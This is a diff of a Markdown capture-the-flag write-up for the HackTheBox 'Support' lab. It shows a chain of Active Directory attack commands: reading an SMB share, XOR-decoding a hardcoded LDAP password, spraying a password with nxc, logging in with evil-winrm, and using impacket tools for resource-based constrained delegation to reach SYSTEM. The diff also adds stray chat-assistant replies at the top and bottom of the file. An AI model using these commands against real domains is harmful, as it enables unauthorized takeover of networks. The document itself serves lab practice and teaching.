@@ -1,3 +1,10 @@
+Got it ✅ — I’ll give you a **fully cleaned up `.md` file** with:
+
+* Consistent code blocks (`zsh`, `bash`, `csharp`, `py`, `json`).
+* No inline comments from me (so you don’t need to delete anything).
+* Proper fencing and formatting.
+
+Here’s the polished version:
 
 ---
 
@@ -59,13 +66,9 @@ smbclient //support.htb/support-tools -U 'Guest'
 UserInfo.exe.zip
 ```
 
-* Discovered a readable share with an unusual application: **UserInfo.exe**.
-
 ---
 
 ## 🔍 Reverse Engineering UserInfo.exe
-
-Decompiling revealed LDAP credentials:
 
 ```csharp
 public LdapQuery()
@@ -76,8 +79,6 @@ public LdapQuery()
     this.ds = new DirectorySearcher(this.entry);
 }
 ```
-
-The password was obfuscated:
 
 ```csharp
 private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
@@ -98,8 +99,6 @@ plain = bytes([c ^ key[i % len(key)] ^ 223 for i, c in enumerate(cipher)])
 print(plain.decode())
 ```
 
-Decoded password:
-
 ```
 nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
 ```
@@ -114,25 +113,17 @@ nxc ldap support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
 [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 
 ```
 
-* Valid domain credentials obtained.
-
 ---
 
 ## 🧭 BloodHound
-
-Collected domain data:
 
 ```zsh
 rusthound-ce -d support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -o bloodhound --ldap-filter='(objectGuid=*)' -c All
 ```
 
-* Nothing interesting for `ldap` user.
-
 ---
 
 ## 🗂️ LDAP Enumeration
-
-Custom LDAP enumeration found a suspicious `info` field:
 
 ```json
 "ford.victoria": {
@@ -140,14 +131,9 @@ Custom LDAP enumeration found a suspicious `info` field:
 }
 ```
 
-* Initially appeared to be credentials for `ford.victoria`, but login attempts failed.
-* Enumerated all domain users and built a wordlist.
-
 ---
 
 ## 🔑 Exploitation – Foothold
-
-Brute-forced with known password string:
 
 ```zsh
 nxc smb support.htb -u usernames.txt -p 'Ironside47pleasure40Watchful' --continue-on-success
@@ -168,8 +154,6 @@ evil-winrm -i support.htb -u 'support' -p 'Ironside47pleasure40Watchful'
 c2ee84b4277d7cab7ea5ae7d9bc1d5bc
 ```
 
-* **Result:** User shell obtained.
-
 ---
 
 ## 🚀 Privilege Escalation
@@ -183,25 +167,17 @@ c2ee84b4277d7cab7ea5ae7d9bc1d5bc
 
 ### Exploit: Resource-Based Constrained Delegation (RBCD)
 
-1. Add attacker-controlled computer:
-
 ```zsh
 impacket-addcomputer -method SAMR -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host DC.support.htb -domain-netbios support.htb 'support.htb/support:Ironside47pleasure40Watchful'
 ```
-
-2. Configure delegation:
 
 ```zsh
 impacket-rbcd -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'DC$' -action 'write' 'support.htb/support:Ironside47pleasure40Watchful'
 ```
 
-3. Request TGT as Administrator:
-
 ```zsh
 getST.py -spn cifs/DC.support.htb -impersonate Administrator support.htb/ATTACKERSYSTEM$:'Summer2018!' -dc-ip DC.support.htb
 ```
-
-4. Pass-the-ticket with PsExec:
 
 ```zsh
 export KRB5CCNAME=Administrator.ccache
@@ -212,8 +188,6 @@ impacket-psexec -k -no-pass support.htb/Administrator@DC.support.htb
 C:\Windows\system32> whoami
 nt authority\system
 ```
-
-* **Result:** Full SYSTEM access (Domain Admin).
 
 ---
 
@@ -226,26 +200,28 @@ nt authority\system
 
 ## 🧠 Lessons Learned
 
-* **Technical:**
+**Technical**
 
-  * Reverse engineering revealed hardcoded service account credentials.
-  * LDAP info fields may leak sensitive data (poor OPSEC).
-  * RBCD remains a powerful AD privilege escalation vector.
+* Reverse engineering revealed hardcoded service account credentials.
+* LDAP info fields may leak sensitive data (poor OPSEC).
+* RBCD remains a powerful AD privilege escalation vector.
 
-* **Personal:**
+**Personal**
 
-  * Always test leaked creds against multiple accounts.
-  * Automating LDAP parsing speeds up discovery of hidden values.
+* Always test leaked creds against multiple accounts.
+* Automating LDAP parsing speeds up discovery of hidden values.
 
-* **Reusable Techniques:**
+**Reusable Techniques**
 
-  * Decode obfuscation (base64 + XOR).
-  * Use BloodHound to identify misconfigurations.
-  * Exploit RBCD for Domain Admin when `GenericAll` on DC computer object.
+* Decode obfuscation (base64 + XOR).
+* Use BloodHound to identify misconfigurations.
+* Exploit RBCD for Domain Admin when `GenericAll` on DC computer object.
+
+---
+
+```
 
 ---
 
-````
-
----
-````
+Do you want me to save this cleaned version as a `.md` file so you can download and drop it straight into your repo?
+```
